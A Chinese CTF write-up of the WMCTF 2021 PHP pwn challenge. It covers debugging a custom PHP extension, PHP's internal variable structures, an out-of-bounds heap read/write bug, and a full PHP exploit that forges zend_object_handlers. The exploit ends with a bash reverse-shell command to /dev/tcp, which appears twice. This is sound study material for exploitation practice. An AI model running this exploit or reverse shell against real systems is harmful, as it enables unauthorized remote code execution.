# 2021WMCTF_checkin学习PHP PWN

阅读量 **318355**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-10-05 10:00:26

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t013cc0dcbc0f6e4379.jpg)

很早的比赛中就出现了web pwn类型的题目，不久前参加的WMCTF中也出现了一道PHP PWN，以前从来没有接触过，比赛时无从下手，赛后复现学习一下PHP
PWN的基本利用思路。

## 环境搭建

结合以前该类型的pwn题，考察点主要是php拓展模块的漏洞利用，一般是自己实现的php的so文件，对这个so文件进行逆向分析，找到漏洞点，写php脚本实现漏洞利用。

本题给了一个Docker环境已经部署好php
pwn的环境，并且容器中安装了gdbserver，不需要再自己安装对应版本的php再手动添加拓展模块，并且方便了调试。

只需要将Docker镜像导入再拉起容器即可。

导入镜像命令：

`sudo docker load < wmctf_php_player.tar`

查看导入的镜像：

    
    
    $ sudo docker images                     
    [sudo] password for cc:
    REPOSITORY         TAG       IMAGE ID       CREATED       SIZE
    wmctf_php_player   latest    71dd630d58a3   2 weeks ago   521MB
    

拉起镜像，host模式类似于Vmware的桥接模式，方便使用容器中的gdbserver进行调试：

`sudo docker run --network=host wmctf_php_player`

由于不知道远程交互Docker的启动命令，本地调试的时候直接进入容器，将php脚本放到容器中进行本地调试：  
`sudo docker exec -it cfda32d8606c /bin/bash`

如下：run_php应该就是一个远程交互的接口，功能就是读入用户输入，保存到临时文件中然后php执行。

![](https://p4.ssl.qhimg.com/t01e2b68c951943b69c.png)

容器中php版本如下：

    
    
    root@cc:/# php -v
    PHP 8.0.9 (cli) (built: Jul 30 2021 00:29:20) ( NTS )
    Copyright (c) The PHP Group
    Zend Engine v4.0.9, Copyright (c) Zend Technologies
    

## 本地调试

可以通过如下命令找到php拓展模块：

    
    
    root@cc:/# php -i | grep -i extension_dir
    extension_dir => /usr/local/lib/php/extensions/no-debug-non-zts-20200930 => /usr/local/lib/php/extensions/no-debug-non-zts-20200930
    sqlite3.extension_dir => no value => no value
    root@cc:/# ls /usr/local/lib/php/extensions/no-debug-non-zts-20200930
    opcache.so  sodium.so  wmctf_php_pwn.so
    

前面提到容器中已经安装了gdbserver，运行php，映射到端口6666，在本机上指定该端口即可调试，就本题写一个测试脚本。

    
    
    <?php
        welcome_to_wmctf();
    ?>
    

上述函数时php拓展模块中函数zif_welcome_to_wmctf：

`php_printf("Welcome to WMCTF! :)\nWMcake.BabyCake.Ezcake.simpleCAke.\n");`

Docker：

`gdbserver 127.0.0.1:6666 php 1.php`

本地gdb启动命令：

    
    
    target remote 127.0.0.1:6666
    add-symbol-file wmctf_php_pwn.so
    b zif_welcome_to_wmctf
    c
    

php成功加载了拓展模块：

![](https://p5.ssl.qhimg.com/t0195cb00f796b03ff5.png)

至此，调试环境已经搭好。

## PHP变量基本结构

刚开始逆向wmctf_php_pwn.so的时候，函数传参一脸懵逼，完全通过手头的wp和函数功能来猜参数意义，然后跟着Clang师傅的博客学习了一下PHP变量结构。

以zif_wm_add函数为例，IDA中参数解析部分如下：

    
    
    size_t __fastcall zif_wm_add(__int64 a1, __int64 a2)
    {
      unsigned int args_num; // er12
      __int64 v3; // r12
      size_t v4; // rbx
      size_t result; // rax
      char *v6; // rax
      Cake *v7; // r13
      __int64 v8; // r13
      __int64 v9; // rcx
      unsigned __int64 v10; // [rsp+0h] [rbp-38h] BYREF
      __int64 v11[6]; // [rsp+8h] [rbp-30h] BYREF
    
      args_num = *(_DWORD *)(a1 + 44);
      v10 = 0LL;
      if ( args_num != 2 )
        return zif_wm_add_cold_2(a1, a2);
      if ( *(_BYTE *)(a1 + 88) == 4 )
      {
        v10 = *(_QWORD *)(a1 + 80);
      }
      else
      {
        v8 = a1 + 80;
        if ( !(unsigned __int8)zend_parse_arg_long_slow(a1 + 80, &v10) )
        {
          v9 = 0LL;
          args_num = 1;
          return zend_wrong_parameter_error(9LL, args_num, 0LL, v9, v8);
        }
      }
      if ( *(_BYTE *)(a1 + 104) != 6 )
      {
        v8 = a1 + 96;
        if ( (unsigned __int8)zend_parse_arg_str_slow(a1 + 96, v11) )
        {
          v3 = v11[0];
          goto LABEL_6;
        }
        v9 = 4LL;
        return zend_wrong_parameter_error(9LL, args_num, 0LL, v9, v8);
      }
    

调试在该处下断点，结合php源码Zend/zend_types.h中的定义，跟变量有关的基本结构体是_zval_struct，变量类型由type决定，type决定了value对应的结构体类型:

    
    
    struct _zval_struct {
        zend_value        value;            /* value */
        union {
            uint32_t type_info;
            struct {
                ZEND_ENDIAN_LOHI_3(
                    zend_uchar    type,            /* active type */
                    zend_uchar    type_flags,
                    union {
                        uint16_t  extra;        /* not further specified */
                    } u)
            } v;
        } u1;
        union {
            uint32_t     next;                 /* hash collision chain */
            uint32_t     cache_slot;           /* cache slot (for RECV_INIT) */
            uint32_t     opline_num;           /* opline number (for FAST_CALL) */
            uint32_t     lineno;               /* line number (for ast nodes) */
            uint32_t     num_args;             /* arguments number for EX(This) */
            uint32_t     fe_pos;               /* foreach position */
            uint32_t     fe_iter_idx;          /* foreach iterator index */
            uint32_t     access_flags;         /* class constant access flags */
            uint32_t     property_guard;       /* single property guard */
            uint32_t     constant_flags;       /* constant flags */
            uint32_t     extra;                /* not further specified */
        } u2;
    };
    

type的值也在该文件中：

    
    
    /* Regular data types: Must be in sync with zend_variables.c. */
    #define IS_UNDEF                    0
    #define IS_NULL                        1
    #define IS_FALSE                    2
    #define IS_TRUE                        3
    #define IS_LONG                        4
    #define IS_DOUBLE                    5
    #define IS_STRING                    6
    #define IS_ARRAY                    7
    #define IS_OBJECT                    8
    #define IS_RESOURCE                    9
    #define IS_REFERENCE                10
    #define IS_CONSTANT_AST                11 /* Constant expressions */
    
    /* Fake types used only for type hinting.
     * These are allowed to overlap with the types below. */
    #define IS_CALLABLE                    12
    #define IS_ITERABLE                    13
    #define IS_VOID                        14
    #define IS_STATIC                    15
    #define IS_MIXED                    16
    
    /* internal types */
    #define IS_INDIRECT                 12
    #define IS_PTR                        13
    #define IS_ALIAS_PTR                14
    #define _IS_ERROR                    15
    
    /* used for casts */
    #define _IS_BOOL                    17
    #define _IS_NUMBER                    18
    

根据程序逻辑*（a1+44）是参数个数，zif_wm_add对应的2个参数type值为4、6，即long和string。

![](https://p2.ssl.qhimg.com/t01c54d110787f549d0.png)

以type 6为例，此时的value为zend_string。

    
    
    struct _zend_string {
        zend_refcounted_h gc;
        zend_ulong        h;                /* hash value */
        size_t            len;
        char              val[1];
    };
    

![](https://p4.ssl.qhimg.com/t013494492ab290e531.png)

搞清楚变量基本结构之后，php pwn利用经常用到的一个基本变量结构为zend_object:

    
    
    struct _zend_object {
        zend_refcounted_h gc;
        uint32_t          handle; // TODO: may be removed ???
        zend_class_entry *ce;
        const zend_object_handlers *handlers;
        HashTable        *properties;
        zval              properties_table[1];
    };
    

其中包含了一个`zend_object_handlers`，是一个函数指针表，包含了对`zend_object`对象的操作，可以通过伪造一个`zend_object_handlers`，再劫持`zend_object`中的`zend_object_handlers`指针实现利用。

## 逆向分析

结构体：

    
    
    struct Cake{
        char *buffer;
        int len;
        int flag;
    }
    

漏洞在当edit的newSize小于oldSize时，重新申请一块内存但是没有更新size，所以可以越界读写。

    
    
           if ( oldSize > newSize )
            {
              _efree();
              v10 = (char *)_emalloc(newSize + 1);
              cakeList[idx].cakeName = v10;
              if ( v10 )
              {
                result = (__int64)strncpy(v10, (const char *)(newbuf + 24), newSize);
                goto LABEL_15;
              }
            }
    

## 利用分析

复现学习是以venom的wp为依照，按照该思路进行利用。首先申请两个chunk，chunk的大小与zend_object_handlers结构体相同，然后利用漏洞，释放掉后申请的chunk。

然后声明一个php对象，zend_object结构体会在small chunk后，可以越界读泄露heap地址和elf基址。

    
    
    $lucky = new Lucky();
    $lucky->a0 = "aaaaaaa";
    $lucky->a1 = function ($x) { };
    

并且原来被释放的内存区域变为zend_object_handlers。

![](https://p3.ssl.qhimg.com/t01c0554a5c4efd82a3.png)

查看内存，chunk 0x48下方是一个zend_object结构体：

![](https://p5.ssl.qhimg.com/t01100912a8b1255415.png)

![](https://p2.ssl.qhimg.com/t0158778746ca611a19.png)

将第一个成员变量赋值为字符串’a’*7，可以看出properties_table中是一个zend_string结构体，查看该处内存：

![](https://p4.ssl.qhimg.com/t0186588cd4805dd1b5.png)

从最上方内存布局的图中发现，与该成员变量相邻有一个type 为8 的成员变量，即`#define IS_OBJECT
8`，并且该zval的value指向了我们释放的chunk 0x100。

![](https://p1.ssl.qhimg.com/t01a07dc60455a25efa.png)

![](https://p3.ssl.qhimg.com/t019804c200c6aadd70.png)

php的空闲内存块管理非常简单，隔size大小有一个next指针指向下一个空闲块，所以通过越界写，劫持另一大小空闲块的next。使得有一个指向zend_object_handlers块的指针，目的是读取其中内容在可控堆块中伪造该结构体。

![](https://p0.ssl.qhimg.com/t01de1565bb7704d775.png)

然后利用与zend_object相邻的堆块越界写，劫持type 8
的zval结构体中的value指针，指向前面伪造的可控堆块，然后在可控堆块中伪造命令执行函数指针，即可通过`($lucky->a1)($cmd);`执行任意命令。

此时内存如图：

![](https://p0.ssl.qhimg.com/t013e5d4118e22b8fb7.png)

![](https://p2.ssl.qhimg.com/t0171e0ef4fe25a2b93.png)

在该地址下断点，当执行`($lucky->a1)($cmd);`时：

![](https://p3.ssl.qhimg.com/t0128fcd09ff42b2daa.png)

    
    
    $cmd =  '/bin/bash -c "/bin/bash -i >&/dev/tcp/127.0.0.1/6666 0>&1"';
    ($lucky->a1)($cmd);
    

成功反弹shell：

![](https://p2.ssl.qhimg.com/t017a55f1153de04cd6.png)

还有一种做法是劫持libc中efree_got，就有点像libc pwn，就不分析了。

## 总结

深入学习之后觉得与其他的pwn并没有太大区别，学无止境，继续努力吧。

## exp

    
    
    <?php
        function ptr2str($ptr, $m = 8) {
            $out = "";
            for ($i=0; $i < $m; $i++) {
                $out .= chr($ptr & 0xff);
                $ptr >>= 8;
            }
            return $out;
        }
        function write(&$str, $p, $v, $n = 8) {
            $i = 0;
            for($i = 0; $i < $n; $i++) {
                $str[$p + $i] = chr($v & 0xff);
                $v >>= 8;
            }
        }
        function str2ptr(&$str, $p = 0, $s = 8) {
            $address = 0;
            for($j = $s-1; $j >= 0; $j--) {
                $address <<= 8;
                $address |= ord($str[$p+$j]);
            }
            return $address;
        }
        function get_bytes($idx, $offset, $cnt){
            $address = 0;
            $i = 0;
            for($i = $cnt-1; $i >= 0; --$i) {
                $tmp = ord(wm_get_byte($idx, $offset+$i));
                $address <<= 8;
                $address |= $tmp;
            }
            return $address;
        }
        function edit_bytes($idx, $offset, $cnt, $data){
            $address = 0;
            $i = 0;
            for($i = 0; $i < $cnt; ++$i) {
                $tmp = $data & 0xff;
                wm_edit_byte($idx, $offset+$i, $tmp);
                $data >>= 8;
            }
        }
        class Lucky{
          public    $a0, $a1;
       }
        $str = str_repeat('B', (0x100));
        welcome_to_wmctf();
        wm_add(4, $str);
        wm_add(0, $str);
        $str1 = str_repeat('B', (0x47));
        wm_edit(0, $str1);
        $lucky = new Lucky();
        $lucky->a0 = "aaaaaaa";
        $lucky->a1 = function ($x) { };
        $object_addr = get_bytes(0, 0x88, 8);
        $elf_addr = get_bytes(0, 0x68, 8)-0xa6620-0x1159000;
        echo "object_addr ==> 0x".dechex($object_addr)."\n";
        echo "elf_addr ==> 0x".dechex($elf_addr)."\n";
        wm_add(1, $str);
        wm_edit(1, "A");
        edit_bytes(1, 8, 8, $object_addr);#chunk 0
        wm_add(2, "A");
        wm_add(3, $str); 
        wm_edit(3, ptr2str(1, 1));# chunk3 = chunk0
        for($i = 0; $i < 0x100; $i+=8){
            $tmp = get_bytes(3, $i, 8);
            edit_bytes(4, $i, 8, $tmp);
        }
        edit_bytes(0, 0x88, 8, $object_addr-0x140);# change 2 fake struct
        edit_bytes(4, 0x70, 8, $elf_addr+0x429470);
        edit_bytes(4, 0x38, 4, 1);
        $cmd =  '/bin/bash -c "/bin/bash -i >&/dev/tcp/127.0.0.1/6666 0>&1"';
        ($lucky->a1)($cmd);
    ?>
    

## 参考

<https://www.anquanke.com/post/id/235237>

比较详细的介绍了环境搭建的过程

https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/Sy7hS9bBS?type=view

详细介绍了php变量基本结构

[https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247496630&idx=1&sn=f17c447a3f71d5749c88d58e69b28a4b](https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247496630&idx=1&sn=f17c447a3f71d5749c88d58e69b28a4b)  
venom wp

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **C4oy1** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/253189](/post/id/253189)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [PHP pwn](/tag/PHP pwn)
  * [web pwn](/tag/web pwn)

 **+1** __1赞

 __收藏

![](https://p0.ssl.qhimg.com/t010fc4391fc78be88c.png) C4oy1

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

